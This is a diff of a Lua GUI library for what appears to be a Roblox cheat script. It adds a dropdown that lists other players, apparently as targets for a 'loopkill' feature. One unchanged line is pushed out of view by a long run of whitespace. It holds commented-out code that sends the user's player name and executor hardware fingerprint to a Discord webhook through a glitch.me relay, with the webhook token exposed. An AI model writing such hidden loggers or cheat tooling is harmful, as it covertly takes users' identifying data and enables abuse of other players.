@@ -210,7 +210,11 @@ function removewithoutdupes(tab, thethingyouneedtoremove) -- my own code :sungla
 	end
 end	
 
-getgenv().loopkillplr = {}
+local loopkillplr = {}
+for i,v in pairs(game.Players:GetPlayers()) do
+	if v == game.Players.LocalPlayer then continue end
+	table.insert(loopkillplr,v.Name)
+end
 local txt = game:GetService("TextService") 
 
 function library:Tween(...) game:GetService("TweenService"):Create(...):Play() end 
@@ -6529,19 +6533,281 @@ end)
 								end 
 								values[tabname][sectorname][text] = Element.value
 								
-								
-								
-								
-								
-								
-								
-								
-								
-								
-								
-								
-								
-									
+							elseif type == "lmao3" then 
+								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
+								Element.value = {Jumbobox = {}} 
+								data.options = data.options or {} 
+
+								local Dropdown = C.INST("Frame") 
+								local Button = C.INST("TextButton") 
+								local TextLabel = C.INST("TextLabel") 
+								local Drop = C.INST("ScrollingFrame") 
+								local Button_2 = C.INST("TextButton") 
+								local TextLabel_2 = C.INST("TextLabel") 
+								local UIListLayout = C.INST("UIListLayout") 
+								local ImageLabel = C.INST("ImageLabel") 
+								local TextLabel_3 = C.INST("TextLabel") 
+
+								Dropdown.Name = "Dropdown" 
+								Dropdown.Parent = Inner 
+								Dropdown.BackgroundColor3 = C.COL3RGB(33, 35, 255) 
+								Dropdown.BackgroundTransparency = 1.000 
+								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
+								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 
+
+								Button.Name = "Button" 
+								Button.Parent = Dropdown 
+								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
+								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
+								Button.Position = C.UDIM2(0, 30, 0, 16) 
+								Button.Size = C.UDIM2(0, 175, 0, 17) 
+								Button.AutoButtonColor = false 
+								Button.Font = Enum.Font.SourceSans 
+								Button.Text = "" 
+								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
+								Button.TextSize = 11.000
+
+								TextLabel.Parent = Button 
+								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
+								TextLabel.BackgroundTransparency = 1.000 
+								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
+								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
+								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
+								TextLabel.Font = Enum.Font.Gotham 
+								TextLabel.Text = "..." 
+								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
+								TextLabel.TextSize = 11.000
+								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
+
+								local abcd = TextLabel 
+
+								Drop.Name = "Drop" 
+								Drop.Parent = Button 
+								Drop.Active = true 
+								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
+								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
+								Drop.Position = C.UDIM2(0, 0, 1, 1) 
+								Drop.Size = C.UDIM2(1, 0, 0, 20) 
+								Drop.Visible = false 
+								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
+								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
+								Drop.ScrollBarThickness = 4 
+								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
+								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
+								--Drop.AutomaticCanvasSize = "Y" 
+								for i,v in pairs(data.options) do 
+									Drop.CanvasSize = Drop.CanvasSize + C.UDIM2(0, 0, 0, 17) 
+								end 
+								Drop.ZIndex = 5 
+								Drop.ScrollBarImageColor3 = getMainColor() 
+
+								UIListLayout.Parent = Drop 
+								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
+								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
+
+								values[tabname][sectorname][text] = Element.value 
+
+								local num = #data.options 
+								if num > 5 then 
+									Drop.Size = C.UDIM2(1, 0, 0, 85) 
+								else 
+									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
+								end 
+								local first = true 
+
+								local function updatetext() 
+									local old = {} 
+									for i,v in ipairs(data.options) do 
+										if C.TBLFIND(Element.value.Jumbobox, v) then 
+											C.INSERT(old, v) 
+										else 
+										end 
+									end 
+									local str = "" 
+
+
+									if #old == 0 then 
+										str = "..." 
+									else 
+										if #old == 1 then 
+											str = old[1] 
+										else 
+											for i,v in ipairs(old) do 
+												if i == 1 then 
+													str = v 
+												else 
+													if i > 2 then 
+														if i < 4 then 
+															str = str..",  ..." 
+														end 
+													else 
+														str = str..",  "..v 
+													end 
+												end 
+											end 
+										end 
+									end 
+
+									abcd.Text = str 
+								end 
+							function updatejumbo()	
+								for i,v in ipairs(data.options) do 
+									do 
+										local Button = C.INST("TextButton") 
+										local TextLabel = C.INST("TextLabel") 
+
+										Button.Name = v 
+										Button.Parent = Drop 
+										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
+										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
+										Button.Position = C.UDIM2(0, 30, 0, 16) 
+										Button.Size = C.UDIM2(0, 175, 0, 17) 
+										Button.AutoButtonColor = false 
+										Button.Font = Enum.Font.SourceSans 
+										Button.Text = "" 
+										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
+										Button.TextSize = 11.000
+										Button.BorderSizePixel = 0 
+										Button.ZIndex = 6 
+
+										TextLabel.Parent = Button 
+										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
+										TextLabel.BackgroundTransparency = 1.000 
+										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
+										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
+										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
+										TextLabel.Font = Enum.Font.Gotham 
+										TextLabel.Text = v 
+										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
+										TextLabel.TextSize = 11.000
+										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
+										TextLabel.ZIndex = 6 
+
+										Button.MouseButton1Down:Connect(function() 
+											if C.TBLFIND(Element.value.Jumbobox, v) then 
+												for i,a in pairs(Element.value.Jumbobox) do 
+													if a == v then 
+														C.TBLREMOVE(Element.value.Jumbobox, i) 
+													end 
+												end 
+												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
+											else 
+												C.INSERT(Element.value.Jumbobox, v) 
+												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
+											end 
+											updatetext() 
+
+											values[tabname][sectorname][text] = Element.value 
+											callback(Element.value) 
+										end) 
+										Button.MouseEnter:Connect(function() 
+											if not C.TBLFIND(Element.value.Jumbobox, v) then 
+												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = getMainColor()}) 
+											end 
+										end) 
+										Button.MouseLeave:Connect(function() 
+											if not C.TBLFIND(Element.value.Jumbobox, v) then 
+												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
+											end 
+										end) 
+
+										first = false 
+										Players.PlayerAdded:Connect(function()
+											Button:Destroy()
+											TextLabel:Destroy()
+										end)
+										Players.PlayerRemoving:Connect(function()
+											Button:Destroy()
+											TextLabel:Destroy()
+										end)
+									end 
+								end 
+							end
+							updatejumbo()
+							
+							
+Players.PlayerAdded:Connect(function()
+	table.clear(data.options)
+	for i,v in pairs(game.Players:GetPlayers()) do
+		C.INSERT(data.options, v.Name)
+	end
+	updatejumbo()
+end)
+																																																																																																																																																																																																																																																																																																														--if not signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
+Players.PlayerRemoving:Connect(function(plr) 
+	table.clear(data.options)
+	for i,v in pairs(game.Players:GetPlayers()) do
+		C.INSERT(data.options, v.Name)
+	end
+	updatejumbo()
+end)							
+							
+							
+								function Element:SetValue(val) 
+									Element.value = val 
+									for i,v in pairs(Drop:GetChildren()) do 
+										if v.Name ~= "UIListLayout" then 
+											if C.TBLFIND(val.Jumbobox, v.Name) then 
+												v.TextLabel.TextColor3 = getMainColor() 
+											else 
+												v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
+											end 
+										end 
+									end 
+									updatetext() 
+									values[tabname][sectorname][text] = Element.value 
+									callback(val) 
+								end 
+								if data.default then 
+									Element:SetValue(data.default) 
+								end 
+
+								ImageLabel.Parent = Button 
+								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
+								ImageLabel.BackgroundTransparency = 1.000 
+								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
+								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
+								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 
+
+								TextLabel_3.Parent = Dropdown 
+								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
+								TextLabel_3.BackgroundTransparency = 1.000 
+								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
+								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
+								TextLabel_3.Font = Enum.Font.Gotham 
+								TextLabel_3.Text = text 
+								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
+								TextLabel_3.TextSize = 11.000
+								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 
+
+								Button.MouseButton1Down:Connect(function() 
+									Drop.Visible = not Drop.Visible 
+									if not Drop.Visible then 
+										Drop.CanvasPosition = C.Vec2(0,0) 
+									end 
+								end) 
+								local indrop = false 
+								local ind = false 
+								Drop.MouseEnter:Connect(function() 
+									indrop = true 
+								end) 
+								Drop.MouseLeave:Connect(function() 
+									indrop = false 
+								end) 
+								Button.MouseEnter:Connect(function() 
+									ind = true 
+								end) 
+								Button.MouseLeave:Connect(function() 
+									ind = false 
+								end) 
+								game:GetService("UserInputService").InputBegan:Connect(function(input) 
+									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
+										if Drop.Visible == true and not indrop and not ind then 
+											Drop.Visible = false 
+											Drop.CanvasPosition = C.Vec2(0,0) 
+										end 
+									end 
+								end) 								
 								
 							elseif type == "Slider" then 
 
